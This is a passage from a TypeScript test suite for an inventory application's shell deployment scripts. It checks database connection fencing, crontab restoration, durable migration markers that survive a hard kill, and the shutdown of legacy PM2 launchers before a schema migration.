  const unfence = realCodeLine(INSTALL_LINES, /^unfence_cron$/)

  assert.notEqual(release, -1, 'the connection fence must come down before the start')
  assert.ok(release < start, 'the application cannot serve a database it may not connect to')
  assert.ok(removeFence > release && removeFence < start, 'and the AssertPathExists marker must go before the start too')

  assert.notEqual(unfence, -1, 'the crontab must be restored')
  assert.ok(unfence > start, 'but only once the new build is running')

  // The crontab block is spliced from the LIVE crontab, so restoring it after the splice
  // would leave every fenced line commented out and the queue workers silently off.
  //
  // The read that feeds it is the shared, fail-closed one now (o3d-p9dq, Codex r28) rather than a
  // second `crontab -l 2>/dev/null || true`, so the splice is located by its awk and the feed is
  // asserted on its own line.
  const splice = realCodeLine(INSTALL_LINES, /\| awk -v port="\$\{APP_PORT\}" -v blockfile=/)
  assert.notEqual(splice, -1, 'the managed cron block is spliced into whatever the crontab currently holds')
  assert.match(INSTALL_LINES[splice - 1], /printf '%s\\n' "\$\{existing\}"/,
    'and it is fed from the crontab this run READ, not from a second unguarded read')
  assert.notEqual(realCodeLine(INSTALL_LINES, /^\s*existing="\$\{CRONTAB_READ_TEXT\}"$/), -1,
    'which is what the shared reader returned')
  assert.ok(unfence < splice, 'cron must be unfenced BEFORE the managed block is spliced into it')
})

test('install.sh never restarts what it stopped on a post-stop failure', () => {
  const trapStart = INSTALL_LINES.findIndex((line) => line.startsWith('on_cutover_exit() {'))
  assert.notEqual(trapStart, -1, 'the upgrade cutover must have a failure path')
  const trapEnd = INSTALL_LINES.findIndex((line, index) => index > trapStart && line === '}')
  const trapBody = INSTALL_LINES.slice(trapStart, trapEnd).filter(isCode).join('\n')

  assert.ok(!/systemctl\s+start/.test(trapBody), 'the failure path must never start the service again')
  assert.ok(!/systemctl\s+enable/.test(trapBody), 'nor re-enable it')
  assert.ok(!/systemctl\s+unmask/.test(trapBody), 'nor lift the fence')
  assert.ok(/systemctl stop/.test(trapBody), 'it re-stops rather than restarts')
  assert.match(trapBody, /if \$\{SCHEMA_TOUCHED\}; then/, 'and holds the connection fence only once the schema may have moved')
  assert.match(trapBody, /release_db_connections/, 'while a pre-migration failure still releases it')
})

// ---------------------------------------------------------------------------
// o3d-2sm1.4 (Codex r3, CRITICAL) — A HARD INTERRUPTION LEFT `schema_touched=false`.
//
// Round 3 set SCHEMA_TOUCHED in shell memory immediately before Prisma ran and left the
// DURABLE marker to the exit trap. A SIGKILL, an OOM kill or a power cut during
// `prisma migrate deploy` never reaches a trap: the file on disk still said
// `schema_touched=false`, and the next run's adoption — which reads that file and nothing
// else — RELEASED the connection fence over a half-migrated schema. That is the CRITICAL
// the previous round fixed, arriving through the one path the trap cannot cover.
//
// These tests RUN the shipped marker writer (extracted verbatim from the script) rather
// than describing it, because a re-implementation would pass while the script wrote
// something else. The hard kill is modelled the only way it can be: the trap is never
// invoked, and what is on disk at that moment is all there is.
// ---------------------------------------------------------------------------

const INSTALL_SOURCE = INSTALL_LINES.join('\n')

const MARKER_CASES = [
  {
    name: 'deploy.sh',
    source: DEPLOY_LINES.join('\n'),
    markerFn: 'write_fence_marker',
    markerCall: 'write_fence_marker "cutover started"',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
STATE_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
CURRENT_STEP=migrate
FENCE_MASK=true
SCHEMA_TOUCHED=false
DB_FENCE_UP=true
APP_DIR_REAL=/opt/app
PORT=3000
CRON_BACKUP="\${STATE_DIR}/crontab.bak"
SERVICE_UNITS=(app.service)
DB_FENCE_STATE="\${STATE_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
ok() { :; }
die() { echo "die: $*" >&2; exit 1; }
`,
  },
  {
    name: 'update.sh',
    source: UPDATE_LINES.join('\n'),
    markerFn: 'write_fence_marker',
    markerCall: 'write_fence_marker "cutover started"',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
CURRENT_STEP=migrate
FENCE_MASK=true
SCHEMA_TOUCHED=false
DB_FENCE_UP=true
BACKUP_FILE=''
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
DB_FENCE_STATE="\${DATA_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
success() { :; }
die() { echo "die: $*" >&2; exit 1; }
`,
  },
  {
    name: 'install.sh',
    source: INSTALL_SOURCE,
    markerFn: 'write_cutover_marker',
    markerCall: 'write_cutover_marker "cutover started"',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
CUTOVER_STEP=migrate
APP_DIR=/opt/app
APP_NAME=one-two-inventory
FENCE_ARMED=true
SCHEMA_TOUCHED=false
DB_FENCE_UP=true
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
DB_FENCE_STATE="\${DATA_DIR}/db-connect-fence.json"
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
success() { :; }
die() { echo "die: $*" >&2; exit 1; }
`,
  },
] as const

/**
 * A STATE DIRECTORY WITH AN ANCHOR ABOVE IT (o3d-rn10 r2).
 *
 * publish_durable_file() refuses a trust root whose OWN PARENT the service account could rename
 * inside, and /tmp is 1777 — so a mkdtemp directory used directly as ${CUTOVER_STATE_DIR} or
 * ${DATA_DIR} is a root with no anchor, and every publication in a rig that did so would fail for
 * a reason unrelated to what the rig measures. One nesting level gives the state directory a 0700
 * parent of this run's own, which is the standing /var/lib gives it in production. The returned
 * `dir` is the state directory; `outer` is what the caller removes.
 */
function anchoredStateDir(prefix: string): { outer: string; dir: string } {
  const outer = mkdtempSync(join(tmpdir(), prefix))
  const dir = join(outer, 'state')
  mkdirSync(dir)
  return { outer, dir }
}

/**
 * ${APP_DIR}, ${CUTOVER_STATE_DIR} and ${DB_FENCE_RECOVERY_DIR} under ONE anchor, for the reason
 * anchoredStateDir() gives: each of the three is a publication root, and a root directly beneath a
 * 1777 directory has no anchor and is refused.
 */
function anchoredRoots(prefix: string): { outer: string; app: string; state: string; recovery: string } {
  const outer = mkdtempSync(join(tmpdir(), prefix))
  const dirs = { outer, app: join(outer, 'app'), state: join(outer, 'state'), recovery: join(outer, 'recovery') }
  for (const dir of [dirs.app, dirs.state, dirs.recovery]) mkdirSync(dir)
  return dirs
}

/** Run the script's OWN marker functions, then walk away — exactly what a SIGKILL leaves. */
function runMarkerHarness(entry: (typeof MARKER_CASES)[number], call: string): string {
  const { outer, dir } = anchoredStateDir('ims-marker-')
  try {
    const program = [
      'set -euo pipefail',
      entry.preamble(dir),
      durabilityFunctions(entry.source),
      shellFunction(entry.source, entry.markerFn),
      shellFunction(entry.source, 'mark_schema_touched'),
      call,
    ].join('\n')
    execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    return readFileSync(join(dir, MARKER_NAME), 'utf8')
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
}

for (const entry of MARKER_CASES) {
  test(`${entry.name} persists schema_touched BEFORE prisma, so a hard kill is adopted as a migration attempt`, () => {
    // THE KILL. mark_schema_touched runs and the process ends there — no exit trap, no
    // second write, nothing. What follows is the only evidence the next run will have.
    const marker = runMarkerHarness(entry, 'mark_schema_touched')

    assert.match(
      marker,
      /^schema_touched=true$/m,
      'the marker on disk must already say the schema may have moved before prisma is invoked',
    )

    // AND IT IS READ THROUGH ADOPTION'S OWN PREDICATE, not through a paraphrase of it.
    const predicate = adoptionPredicate(entry.source)
    const dir = mkdtempSync(join(tmpdir(), 'ims-adopt-'))
    try {
      const file = join(dir, 'marker')
      execFileSync('bash', ['-c', `cat > "${file}"`], { input: marker })
      const status = execFileSync('bash', [
        '-c',
        `grep -qE '${predicate}' "${file}" && echo HOLD || echo RELEASE`,
      ], { encoding: 'utf8' }).trim()
      assert.equal(
        status,
        'HOLD',
        'adoption must read this marker as "a migration was attempted" and HOLD the connection fence',
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} still records schema_touched=false for a kill BEFORE the migration`, () => {
    // The other half of the distinction, and the reason this is not just "always hold": a
    // run killed while stopping writers or arming a fence has moved nothing, and a revoke
    // nobody undoes is an application that cannot reach its database.
    const marker = runMarkerHarness(entry, entry.markerCall)
    assert.match(marker, /^schema_touched=false$/m, 'nothing had moved, so adoption must release')

    const predicate = adoptionPredicate(entry.source)
    const dir = mkdtempSync(join(tmpdir(), 'ims-adopt-'))
    try {
      const file = join(dir, 'marker')
      execFileSync('bash', ['-c', `cat > "${file}"`], { input: marker })
      const status = execFileSync('bash', [
        '-c',
        `grep -qE '${predicate}' "${file}" && echo HOLD || echo RELEASE`,
      ], { encoding: 'utf8' }).trim()
      assert.equal(status, 'RELEASE', 'a pre-migration kill must not leave the database unreachable')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} raises the flag ONLY where it is also persisted, and before prisma runs`, () => {
    // The defect was a flag raised in shell memory next to the migration command with the
    // durable write left to a trap that a SIGKILL never reaches. So there is exactly ONE
    // place the flag is raised, and it is the function that writes and flushes the marker:
    // a second `SCHEMA_TOUCHED=true` anywhere is that defect coming back.
    const lines = entry.source.split(/\r?\n/)
    const marker = shellFunction(entry.source, 'mark_schema_touched')
    assert.match(marker, /^\s*SCHEMA_TOUCHED=true$/m, 'mark_schema_touched() is where it is raised')

    // Only two raises are legitimate: inside mark_schema_touched (which persists it), and
    // adoption CARRYING FORWARD a raise a previous run already persisted. Anything else is
    // a flag that exists only in memory — the defect, back again.
    const markerLines = new Set(marker.split(/\r?\n/))
    for (let index = 0; index < lines.length; index += 1) {
      if (!/^[ \t]*SCHEMA_TOUCHED=true$/.test(lines[index])) continue
      // Carried forward EITHER by grepping the marker on the line above, or by testing the
      // single variable adoption derived from that grep — which is the form the conservative
      // incomplete-marker reading forced, since it must decide the answer in one place.
      const previous = lines[index - 1] ?? ''
      const carriedForward =
        /grep -qE '\^schema_touched=true\$'/.test(previous) ||
        /^\s*if \$\{?[a-zA-Z_]*[Aa][Dd][Oo][Pp][Tt][Ee][Dd]_SCHEMA_TOUCHED\}?; then$/i.test(previous)
      assert.ok(
        markerLines.has(lines[index]) || carriedForward,
        `SCHEMA_TOUCHED is raised at line ${index + 1} neither by mark_schema_touched() nor by reading the persisted marker`,
      )
    }

    // And the LAST call to mark_schema_touched precedes the migration: an interrupted,
    // half-applied or killed migration is exactly what the flag is for, so a call after
    // prisma returns would be false for every case it exists to cover.
    const migrateCmd = realCodeLine(lines, 'prisma migrate deploy')
    assert.notEqual(migrateCmd, -1, 'the script must actually run the migration')
    let lastMark = -1
    for (let index = 0; index < lines.length; index += 1) {
      if (isCode(lines[index]) && !lines[index].includes('[DRY]') && /^\s*mark_schema_touched$/.test(lines[index])) {
        lastMark = index
      }
    }
    assert.notEqual(lastMark, -1, 'mark_schema_touched must be called')
    assert.ok(lastMark < migrateCmd, 'every call to it must come before `prisma migrate deploy`')
  })

  test(`${entry.name} flushes the marker instead of leaving it in the page cache`, () => {
    // A marker that only reached the page cache is not evidence a power cut leaves behind,
    // and a power cut is half of what this flag is for. Two barriers, not one: the file's
    // own data BEFORE the rename, and the containing directory AFTER it — an atomic rename
    // whose directory entry was never flushed reboots as the old name, or as no name.
    const writer = shellFunction(entry.source, entry.markerFn)
    assert.match(
      writer,
      /\| publish_durable_file "\$\{?FENCE_FILE\}?"/,
      'the marker must be PUBLISHED, never written in place over the last durable one',
    )
    assert.ok(
      !/^\s*\} > "\$\{?FENCE_FILE\}?"/m.test(writer),
      'and it must not truncate the authoritative marker to fill it afterwards',
    )

    const publish = shellFunction(entry.source, 'publish_durable_file')
    const fileBarrier = publish.indexOf('fsync_path "$tmp"')
    // o3d-czpy: `-T`, so a DIRECTORY planted at the target name is refused rather than filled
    // with a stray temporary while the run reports success.
    // o3d-czpy r2: never the absolute target, which re-resolved the destination parent at the
    // instant of the rename.
    // o3d-secops r19: and no longer `../${base}` either. `..` is the kernel's own parent link, so
    // no rename of a NAME above the staging directory could redirect it — but it is a property of
    // WHERE THE STAGING DIRECTORY IS, and a staging directory moved wholesale into another parent
    // takes it along. The destination is a descriptor opened before the staging directory exists,
    // so `/proc/self/fd/N/${base}` is `renameat(N, "${base}", …)` and names nothing that can move.
    const rename = publish.indexOf('mv -f -T "$tmp" "/proc/self/fd/${dest}/${base}"')
    // And the directory barrier flushes THAT SAME DESCRIPTOR — the directory the rename landed in,
    // asked for as an open file rather than as `..` of wherever the staging directory now is.
    const dirBarrier = publish.indexOf('fsync_path "/proc/self/fd/${dest}"')
    assert.ok(fileBarrier !== -1, 'the data must be fsynced')
    assert.ok(rename !== -1, 'and published by rename')
    assert.ok(dirBarrier !== -1, 'and the parent directory fsynced')
    assert.ok(fileBarrier < rename, 'the data barrier comes BEFORE the rename')
    assert.ok(rename < dirBarrier, 'the directory barrier comes AFTER it')
    assert.match(shellFunction(entry.source, 'fsync_path'), /\bsync\b/, 'and fsync_path must actually flush')

    const mark = shellFunction(entry.source, 'mark_schema_touched')
    assert.match(
      mark,
      /grep -qE '\^schema_touched=true\$'/,
      'and mark_schema_touched must confirm what actually landed on disk',
    )
    assert.match(mark, /\bdie\b/, 'refusing to migrate when the attempt cannot be recorded')
  })

  test(`${entry.name} records which fence is actually standing in the marker`, () => {
    const marker = runMarkerHarness(entry, 'mark_schema_touched')
    assert.match(
      marker,
      /^db_connect_fence=held$/m,
      'the marker must say whether the connection fence is up, not leave the operator to guess',
    )
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.4 (Codex r3, HIGH) — KNOWN-UNFENCED DEPLOYMENTS WERE ALLOWED TO MIGRATE.
//
// Exit 3 from scripts/fence-db-connections.mjs means CONNECT was NOT revoked. Round 3
// warned and fell back to the point-in-time probe, which is the same mistake the probe
// itself was: a sibling server or a legacy process can connect at any moment after the
// snapshot. A fence you know is absent is not a degraded fence, it is no fence.
// ---------------------------------------------------------------------------

for (const [name, source] of [
  ['deploy.sh', DEPLOY_LINES.join('\n')],
  ['update.sh', UPDATE_LINES.join('\n')],
  ['install.sh', INSTALL_SOURCE],
] as const) {
  test(`${name} aborts when the database could not be fenced (exit 3)`, () => {
    const fence = shellFunction(source, 'fence_db_connections')
    const exitThree = fence.slice(fence.indexOf('\n    3)'))
    assert.notEqual(fence.indexOf('\n    3)'), -1, 'exit 3 must be handled explicitly')
    assert.match(exitThree, /\bdie\b/, 'exit 3 must abort the cutover, not warn and carry on')
    assert.ok(
      !/^\s*warn "THE DATABASE IS NOT FENCED/m.test(fence),
      'the "NOT FENCED, continuing anyway" fallback must be gone',
    )
    assert.ok(
      !/snapshot only\."\s*$/m.test(fence),
      'a missing fence script must not degrade to a snapshot either',
    )
  })

  test(`${name} refuses a migration it could never fence, before anything is stopped`, () => {
    // The commonest reason a fence is impossible is knowable without asking the database,
    // and discovering it at drain-verify would cost an outage for an unset variable.
    const guard = shellFunction(source, 'require_fenceable_database')
    assert.match(guard, /DEPLOY_ADMIN_DATABASE_URL/, 'it must require the privileged connection')
    assert.match(guard, /\bdie\b/, 'and refuse rather than warn')

    const lines = source.split(/\r?\n/)
    const call = realCodeLine(lines, /^\s*require_fenceable_database$/)
    assert.notEqual(call, -1, 'the guard must actually be called')
    const stop = realCodeLine(lines, /systemctl stop/, call)
    const migrate = realCodeLine(lines, 'prisma migrate deploy', call)
    assert.ok(call < migrate, 'and called before the schema can move')
    assert.ok(stop === -1 || call < stop, 'and before the predecessor is stopped, so a refusal costs no outage')
  })

  test(`${name} re-establishes the connection fence when the start or health check fails`, () => {
    // The fence and the reboot marker come down BEFORE `systemctl start` and the health
    // check, because the new build cannot serve a database it may not connect to. If either
    // then fails the trap used to announce a HELD fence — one it had already released.
    const refence = shellFunction(source, 'refence_db_connections')
    // o3d-secops r23: raising a fence is db_fence_raise() — plan as the service account, validate
    // and publish the authority as root, then `--fence`. A re-fence that only ran `--fence` would
    // now revoke from an authority nothing had republished, which the helper refuses.
    assert.match(refence, /db_fence_raise/, 'the trap-safe re-fence must actually re-apply the revoke')
    assert.ok(!/\bdie\b/.test(refence), 'and must never die, because it runs inside the exit trap')

    const trapName = name === 'install.sh' ? 'on_cutover_exit' : 'on_exit'
    const trap = shellFunction(source, trapName)
    const attempt = trap.indexOf('refence_db_connections')
    const heldClaim = trap.indexOf('DELIBERATELY LEFT UP')
    const markerWrite = trap.search(/write_(fence|cutover)_marker "[^"]*failed/)
    assert.notEqual(attempt, -1, 'the failure path must try to put the fence back')
    assert.ok(attempt < heldClaim, 'the claim "the fence is held" must be made true before it is printed')
    assert.match(trap, /NOT IN PLACE/, 'and when it cannot be, the failure path must say so instead')
    assert.ok(
      markerWrite > attempt,
      'the marker must be written last, so it records the fence state that is true on exit',
    )
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.4 (Codex r3, HIGH) — THE INSTALLER DID NOT RECOGNISE A RUNNING LEGACY
// INSTALLATION.
//
// Upgrade detection looked at the new systemd unit and the crontab only — while the script
// explicitly supports, and later removes, PM2-managed instances. A PM2-run installation was
// therefore not "existing": nothing was fenced, nothing was stopped, and the migration ran
// with the old binary live, on the launcher the cutover was written to remove.
// ---------------------------------------------------------------------------

test('install.sh recognises a legacy PM2 installation and an app-directory process as existing', () => {
  const detect = shellFunction(INSTALL_SOURCE, 'upgrade_in_place')
  assert.match(detect, /legacy_pm2_present/, 'a PM2-managed instance is an existing installation')
  assert.match(detect, /app_dir_pids/, 'and so is any node process serving the app directory')

  const pm2 = shellFunction(INSTALL_SOURCE, 'legacy_pm2_present')
  assert.match(pm2, /pm2-\$\{APP_USER\}/, 'the pm2 systemd unit counts')
  assert.match(pm2, /\.pm2/, 'and so does a PM2 home in the app directory')

  const pids = shellFunction(INSTALL_SOURCE, 'app_dir_pids')
  assert.match(pids, /\/proc\/\$\{pid\}\/cwd/, 'processes are scoped by working directory')
  assert.match(
    pids,
    /app_real/,
    'and compared against the resolved app directory, so a different tree on another port is untouched',
  )
})

test('install.sh stops and drains the legacy launchers BEFORE every migration', () => {
  const stopper = shellFunction(INSTALL_SOURCE, 'stop_legacy_launchers')
  assert.match(stopper, /pm2 delete/, 'the PM2 app must be deleted')
  assert.match(stopper, /pm2 kill/, 'and the daemon killed')
  assert.match(stopper, /disable --now "pm2-/, 'and disabled, so a reboot does not bring it back')
  assert.match(stopper, /kill -9/, 'a process that will not go is killed, not left writing')

  const cutover = codeLine(INSTALL_LINES, /^if upgrade_in_place; then$/)
  const call = realCodeLine(INSTALL_LINES, /^  stop_legacy_launchers$/, cutover)
  const migrate = realCodeLine(INSTALL_LINES, 'prisma migrate deploy', cutover)
  assert.notEqual(call, -1, 'the cutover must stop the launchers the unit file does not cover')
  assert.ok(call < migrate, 'and stop them before the schema moves, not after it')

  // The removal used to live beside the systemd unit install, AFTER the migration.
  const unitInstall = realCodeLine(INSTALL_LINES, /^systemctl daemon-reload$/)
  assert.ok(
    unitInstall === -1 || call < unitInstall,
    'the legacy removal must no longer happen only after the schema has moved',
  )
})

// ---------------------------------------------------------------------------
// The exit-3 refusal, EXECUTED rather than read. `fence_db_connections` is extracted
// verbatim from each script and run against a stub fence script that exits 3 — the code
// path a real "CONNECT was not revoked" takes. It must leave the shell with a non-zero
// status and say what is wrong; a warning that returns 0 is the defect this closes.
// ---------------------------------------------------------------------------

const FENCE_HARNESS = [
  {
    name: 'deploy.sh',
    source: DEPLOY_LINES.join('\n'),
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
APP_USER="$(id -un)"
STATE_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
# o3d-secops r22: the connection-fence directory is walked to beneath a root-owned parent
# now, so a rig that names it must name the parent it hangs off as well.
CUTOVER_STATE_DIR="${'${CUTOVER_STATE_DIR:-'}${dir}}"
CUTOVER_ROOT_DIR='${dir}'
DB_FENCE_DIR='${dir}/fence'
# o3d-secops r28: the recovery wrappers this rig's resolver publishes now take the entrypoint's
# own cutover lock for their whole read/audit/act sequence, so the entrypoint hands them its path
# and a rig that omitted it would be measuring a publication the shipped script cannot perform.
LOCK_FILE='${dir}/cutover.lock'
LEGACY_STATE_DIR_DB_FENCE_STATE="${'${CUTOVER_STATE_DIR}'}/deploy/db-connect-fence.json"
DB_FENCE_SCRIPT='${dir}/app/scripts/fence-db-connections.mjs'
DB_FENCE_STATE='${dir}/db-connect-fence.json'
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_UP=false
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
# o3d-2sm1.5 r31: this entrypoint no longer executes the checkout's fence helper from its own path
# either — it resolves every invocation through the SHARED library, sourced here for real and then
# pointed at the harness directory instead of /etc.
${fenceProtectedLibrary(dir)}
${shellFunction(DEPLOY_LINES.join('\n'), 'resolve_fence_script')}
# o3d-secops r23: raising a fence is plan -> authorise -> execute, and db_fence_raise() (sourced
# above with the library) reaches back for the ONE part each entrypoint supplies for itself, plus
# the namespace library's directory predicate. Lifted rather than stubbed, for the reason
# everything else here is: a rig that supplied its own would stop measuring the shipped ordering.
${shellFunction(CUTOVER_NS_LIB, 'dir_is_private_to_this_run')}
${shellFunction(DEPLOY_LINES.join('\n'), 'db_fence_helper')}
# o3d-secops r32: and the three the migration binding is made of -- the drop to the application
# account carrying MIGRATION_DATABASE_URL, and the two gates that read db_fence_migration_bind() and
# db_fence_migration_witnessed(). Lifted rather than stubbed for the reason everything else
# here is: fence_db_connections() CALLS the first of them, so a rig without it would measure
# an ordering the shipped script does not have.
${shellFunction(DEPLOY_LINES.join('\n'), 'db_fence_migration_helper')}
${shellFunction(DEPLOY_LINES.join('\n'), 'bind_migration_to_fenced_server')}
${shellFunction(DEPLOY_LINES.join('\n'), 'require_migration_landed_on_fenced_server')}
${shellFunction(DEPLOY_LINES.join('\n'), 'pin_migration_window')}
